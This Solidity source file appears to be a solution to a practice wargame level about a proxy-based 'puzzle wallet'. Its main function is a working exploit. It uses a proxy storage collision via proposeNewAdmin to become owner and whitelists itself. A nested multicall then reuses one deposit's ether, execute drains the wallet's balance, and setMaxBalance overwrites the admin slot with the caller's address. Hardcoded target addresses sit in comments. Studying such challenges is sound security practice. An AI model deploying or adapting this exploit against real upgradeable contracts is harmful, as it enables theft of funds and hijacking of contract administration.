// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MyContract {
    // target 0x35Ba0Ee2F38dD63BC206e225aD3d089526A9e489

    // admin 0x725595BA16E76ED1F6cC1e1b65A88365cC494824

    // 1000000000000000

    // function startHack(IPuzzleWallet target) public payable {
    //     target.proposeNewAdmin(address(this));
    //     target.addToWhitelist(address(this));
    // }

    function fooStart(IPuzzleWallet target) public payable {
        require(msg.value == 0.001 ether, "need 0.001 ether !");
        // bytes[] memory data = new bytes[](1);
        // data[0] = abi.encode(bytes4(keccak256("deposit()")));
        // // data[1] = abi.encode(bytes4(keccak256("deposit()")));
        // target.multicall(data);
        // target.multicall(data);
        target.proposeNewAdmin(address(this));
        target.addToWhitelist(address(this));
        bytes[] memory deposit_data = new bytes[](1);
        // depisit_data[0] = abi.encode(bytes4(keccak256("deposit()")));
        deposit_data[0] = abi.encodeWithSelector(target.deposit.selector);
        bytes[] memory data = new bytes[](2);
        data[0] = deposit_data[0];
        data[1] = abi.encodeWithSelector(
            target.multicall.selector,
            deposit_data
        );
        target.multicall{value: msg.value}(data);
        bytes memory my_data = abi.encodeWithSelector(this.foo.selector);
        target.execute(address(this), 0.002 ether, my_data);
        target.setMaxBalance(uint256(uint160(msg.sender)));
    }

    function foo() public payable {}

    function fooAdmins(
        IPuzzleWallet target
    ) public view returns (address, address) {
        return (target.pendingAdmin(), target.admin());
    }

    function fooCheckOwnerAndWhitelist(
        IPuzzleWallet target,
        address _address
    ) public view returns (address owner, bool isWhitelisted) {
        return (target.owner(), target.whitelisted(_address));
    }

    function fooCheckBalance(
        IPuzzleWallet target,
        address _address
    ) public view returns (uint) {
        return target.balances(_address);
    }
}

// interface IPuzzleProxy {
//     function pendingAdmin() external view returns(address);
//     function admin() external view returns(address);
//     function proposeNewAdmin(address _newAdmin) external;
// }

interface IPuzzleWallet {
    function pendingAdmin() external view returns (address);

    function admin() external view returns (address);

    function proposeNewAdmin(address _newAdmin) external;

    function owner() external view returns (address);

    function maxBalance() external view returns (uint);

    function whitelisted(address _addr) external view returns (bool);

    function balances(address _addr) external view returns (uint);

    function setMaxBalance(uint256 _maxBalance) external;

    function addToWhitelist(address _addr) external;

    function deposit() external payable;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;

    function multicall(bytes[] calldata data) external payable;
}

// interface IFoo{
//   function multicall(bytes[] calldata data) external payable;
// }

// contract Foo{
//   uint public number;

//   function deposit() external {
//     number += 1;
//   }

//   // function test() public pure returns(bytes4){
//   //   return bytes4(keccak256("multicall(bytes[])"));
//   // }

//   function multicall(bytes[] calldata data) external payable{
//           bool depositCalled = false;
//           for (uint256 i = 0; i < data.length; i++) {
//               bytes memory _data = data[i];
//               bytes4 selector;
//               assembly {
//                   selector := mload(add(_data, 32))
//               }
//               if (selector == this.deposit.selector) {
//                   require(!depositCalled, "Deposit can only be called once");
//                   // Protect against reusing msg.value
//                   depositCalled = true;
//               }
//               (bool success, ) = address(this).delegatecall(data[i]);
//               require(success, "Error while delegating call");
//           }
//       }

// }
